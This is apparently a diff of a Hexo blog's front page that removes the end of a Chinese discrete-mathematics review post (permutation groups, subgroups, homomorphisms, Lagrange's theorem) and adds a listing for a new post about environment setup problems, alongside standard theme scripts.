-<h3 id="置换群和循环群"><a href="#置换群和循环群" class="headerlink" title="置换群和循环群"></a>置换群和循环群</h3><p>置换群：n阶置换群有n！个</p>
-<p>置换群的乘法：</p>
-<p><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-2.png" alt="6-2"></p>
-<p>注：这个为左合成，右合成过程相反。</p>
-<h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>给定n个元素组成的集合A，A上的置换所构成的群称为<strong>n次置换群</strong>；A上所有置换构成的群称为<strong>n次对称群</strong>。</p>
-<h3 id="子群和群同态"><a href="#子群和群同态" class="headerlink" title="子群和群同态"></a>子群和群同态</h3><h4 id="子群"><a href="#子群" class="headerlink" title="子群"></a>子群</h4><ol>
-<li>若群&lt;G,*&gt;为有限群，对于任意元素a，b∈S，有a * b∈S，那么&lt;S, *&gt;是&lt;G, * &gt;的子群。</li>
-<li>若群&lt;G,*&gt;不确定为有限群，对于任意元素a，b∈S，有a * b∈S 和 若a∈S，那么a^-1∈S，那么&lt;S, *&gt;是&lt;G, * &gt;的子群。</li>
-</ol>
-<h4 id="群同态"><a href="#群同态" class="headerlink" title="群同态"></a>群同态</h4><p>只要满足h(a*b) = h(a) *’ h(b)</p>
-<h3 id="陪集和拉格朗日定理"><a href="#陪集和拉格朗日定理" class="headerlink" title="陪集和拉格朗日定理"></a>陪集和拉格朗日定理</h3><p><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-3.png" alt="6-3"></p>
-<p>拉格朗日定理：子群的阶数是群阶数的因子</p>
-</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/22/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">环境搭建中的一些问题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-22</time><div class="content"></div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
 }</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
